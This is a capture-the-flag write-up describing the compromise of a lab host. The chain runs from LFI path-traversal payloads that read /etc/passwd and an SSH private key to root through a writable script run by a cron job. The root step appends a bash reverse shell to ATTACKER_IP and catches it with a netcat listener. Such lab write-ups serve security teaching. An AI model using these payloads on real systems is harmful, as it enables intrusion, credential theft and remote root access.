In this CTF challenge, the objective was to compromise a target system through a combination of web exploitation and Linux privilege escalation techniques. The lab simulated a realistic attack chain starting from a vulnerable web application and ending with full root access.

🔍 Reconnaissance

Initial enumeration was performed using Nmap to identify open ports and services:

nmap -sC -sV 10.10.10.10

The scan revealed two open ports:

  • Port 80 – Python-based web application running on Werkzeug framework
  • Port 22 – OpenSSH service

🌐 Web Application Analysis

Browsing to the web application on port 80, I found a basic site with a "Features" page. The URL parameter looked like:

http://10.10.10.10/features?page=about.html

I suspected a Local File Inclusion (LFI) vulnerability because the page parameter seemed to load local files without proper validation.

🐞 Exploiting LFI

I tested the classic LFI payload to read /etc/passwd:

http://10.10.10.10/features?page=../../../../etc/passwd

The response returned the contents of /etc/passwd, confirming the vulnerability. Among the output, I noticed a user entry and further enumeration revealed sensitive credentials embedded in a configuration file:

http://10.10.10.10/features?page=../../../../home/user/.ssh/id_rsa

This gave me an SSH private key for the user webapp.

🔑 SSH Access & First Flag

I saved the private key, set correct permissions, and established an SSH connection:

chmod 600 id_rsa
ssh webapp@10.10.10.10 -i id_rsa

Once logged in, I navigated to the user's home directory and found the first flag:

cat /home/webapp/local.txt

Flag 1: CTF{web_lfi_initial_access}

⏱️ Privilege Escalation – Cron Job Misconfiguration

After gaining a low-privilege shell, I started system enumeration. I checked for scheduled cron jobs:

cat /etc/crontab

I found a cron job configured to run every minute as root:

* * * * * root /usr/local/bin/backup.sh

Upon inspecting the script /usr/local/bin/backup.sh, I noticed it executed another file located in a globally writable directory:

#!/bin/bash
source /tmp/config.sh
...

The file /tmp/config.sh was writable by any user – a critical misconfiguration.

💣 Exploiting the Cron Job

I modified /tmp/config.sh to include a reverse shell payload:

echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /tmp/config.sh

I set up a netcat listener on my attacking machine:

nc -lvnp 4444

Within one minute, the cron job executed the script as root, and I received a reverse shell with root privileges.

🏆 Final Flag

With root access, I located the final flag in the root directory:

cat /root/root.txt

Flag 2: CTF{cron_job_root_privilege_escalation}

🧠 Key Takeaways

  • ✔️ Always validate user input – LFI can lead to complete system compromise.
  • ✔️ Never hardcode credentials or expose sensitive files via web parameters.
  • ✔️ Cron jobs running as root should never execute writable scripts from world-accessible directories.
  • ✔️ Follow the principle of least privilege – both for users and scheduled tasks.

🛠️ Tools Used

  • Nmap
  • Browser DevTools
  • SSH
  • Netcat
  • Linux command line (crontab, cat, echo, chmod)

This lab demonstrated how a single LFI vulnerability can chain into full root compromise through system misconfigurations. A great real-world scenario for learning web app security and Linux hardening.
